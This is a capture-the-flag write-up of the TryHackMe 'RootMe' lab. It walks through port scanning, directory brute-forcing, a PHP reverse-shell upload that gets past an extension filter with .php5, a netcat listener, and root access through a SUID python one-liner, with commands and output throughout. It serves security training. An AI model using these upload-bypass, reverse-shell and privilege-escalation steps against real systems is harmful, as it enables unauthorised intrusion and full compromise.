## RootMe Writeup
[Other THM Writeups](../../)

**Author** : [Ridful](../../../)

**THM** : [Ridful](https://tryhackme.com/p/Ridful)

**Twitter** : [Ridful5](https://twitter.com/Ridful5)

# [RootMe](https://tryhackme.com/room/rrootme)


## Task 1
~~*Deploy the Machine*~~

## Task 2
*Reconnaissance*

Do a portscan

sudo nmap -sS -sV -vv -T3 10.10.170.24
```
[...]
Scanning 10.10.170.24 [1000 ports]
Discovered open port 80/tcp on 10.10.170.24
Discovered open port 22/tcp on 10.10.170.24
[...]
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
[...]
```

Directory bruteforcer
```bash
gobuster dir --url http://10.10.170.24/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 60
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.170.24/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.170.24/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.170.24/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.170.24/panel/]
/server-status        (Status: 403) [Size: 277]
Progress: 207643 / 207644 (100.00%)
===============================================================
```
/uploads and /panel seem interesting

- Turns out /uploads is a directory listing for our uploaded files, it's empty for now.
- /panel is an upload form

## Task 3
*Getting a shell*

The upload form along with an apache server being present, could suggest a scenario of us being able to upload and run some php.

In Kali Linux, we've got a php reverse shell we could try: /usr/share/webshells/php/php-reverse-shell.php

cp /usr/share/webshells/php/php-reverse-shell.php ./php-reverse-shell.php

nano php-reverse-shell.php

edit $ip & $port to our IP and the Port we wish to listen on
```
$ip = '<self_ip_address>';
$port = 8888;
```

Open a Netcat listener (or other cat of choice)

nc -lvnp 8888
```
listening on [any] 8888 ...
```

I attempt uploading php-reverse-shell.php to 10.10.170.24/panel
> Upload form doesn't accept .php files.
> We'll want to try and bypass this restriction if possible

I found this good website for bypassing file uploads

https://book.hacktricks.xyz/pentesting-web/file-upload
They've got a bunch of things we can try

I figured one of the .php2, .php3, etc extensions would work, but for experimentation I tried adding symbols, nullbyte, .php.php, etc to see what would happen

Once I was satisfied with that effort, I went back to what I thought would work and uploaded (..., .php5):

Visit 10.10.170.24/uploads/php-reverse-shell.php5

The page is stuck loading, which is different from the other tries, and our netcat listener has picked something up, presumably our reverse shell has succeded!

```
connect to [xx.xx.xx.xxx] from (UNKNOWN) [10.10.170.24] 50602
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:06:29 up  3:47,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

id
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

hostname
```
rootme
```

find / -type f -name user.txt
```
/var/www/user.txt
```

cat /var/www/user.txt
```
THM{xxxxxxxxxxxxxxxx}
```

## Task 4
*Privilege escalation*

sudo -l   to see if we've got access to any sudo commands
> Nope

We should search for files with SUID permissions to see if there's anything we can make use of

find / -perm -u=s -type f 2>/dev/null
```bash
[...]
/usr/bin/chsh
**/usr/bin/python**
/usr/bin/at
[...]
```

ls -la /usr/bin/python
```
-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python
```
Cool, let's check out the python gtfobin

https://gtfobins.github.io/gtfobins/python/

$ /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'

id
```
uid=0(root) gid=33(www-data) groups=33(www-data)
```

sudo -l
```
[...]
User root may run the following commands on rootme:
    (ALL : ALL) ALL
```

find / -type f -name root.txt
```bash
/root/root.txt
```

cat /root/root.txt
```bash
THM{xxxxxxxxxxxxxxxxx}
```

# Reflection

I enjoyed this Room, it was pretty straightforward for the most part, but still provided me with some things that I wish to improve upon.

I.e: Really hammering down on how to best go about the local enumeration for the Privesc.

I'm also thinking there's probably some better wordlists I could use for the Directory bruteforcing instead of the default Kali Linux ones.
I will take time to gain a better understanding of what other lists exist, how they compare, and how each one may serve me best. 

I will also take time to look at alternatives for gobuster, as I'm aware other similar programs exist.
